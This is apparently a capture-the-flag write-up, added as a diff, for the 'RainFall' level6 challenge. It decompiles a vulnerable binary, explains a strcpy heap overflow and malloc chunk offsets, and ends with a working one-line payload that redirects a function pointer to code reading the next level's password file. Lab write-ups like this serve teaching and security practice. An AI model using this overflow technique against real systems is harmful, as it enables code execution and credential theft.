@@ -1,0 +1,59 @@
+scp -P 4242 level6@RainFall:level6 <local_path>
+
+----------------------------------------------------------------------------------
+
+int main(int argc, char **argv) {
+    char *eax = malloc(0x40);        // 64 bytes for a string buffer
+    int32_t (**eax_1)() = malloc(4); // 4 bytes for a function pointer
+    *eax_1 = m;                      // function pointer initialized to m()
+    strcpy(eax, argv[1]);            // ← VULNERABLE: no bounds check
+    return (*eax_1)();               // calls whatever *eax_1 points to
+}
+
+this is a heap overflow taking input from argv[1]
+
+----------------------------------------------------------------------------------
+
+objdump -d /home/user/level6/level6 | grep '<m>'
+08048468 <m>
+
+void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
+
+{
+  puts("Nope");
+  return;
+}
+
+----------------------------------------------------------------------------------
+
+objdump -d /home/user/level6/level6 | grep '<n>'
+08048454 <n>
+
+void n(void)
+
+{
+  system("/bin/cat /home/user/level7/.pass");
+  return;
+}
+
+----------------------------------------------------------------------------------
+
+So we have two mallocs, a strcpy() function that takes av[1] as an argument and 
+doesn't check bounds, and a return that calls *eax_1 which is equal to m.
+What we want is to overflow av[1] and make that return call n() instead.
+
+Malloc adds a header of 8 bytes to each chunk. That means 8 bytes + size
+
+CHUNK 1:		malloc(0x40) = [8 bytes header][64 bytes user data = buf]
+														⎿ strcpy writes here
+
+CHUNK 2:		malloc(4)	 = [8 bytes header][4 bytes = *eax_1]
+													⎿ what we'll overwrite
+
+----------------------------------------------------------------------------------
+
+64 bytes of buf + 8 bytes of header = 72 bytes to reach *eax_1 + the address of n()
+
+n() address = 0x8048454
+
+./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
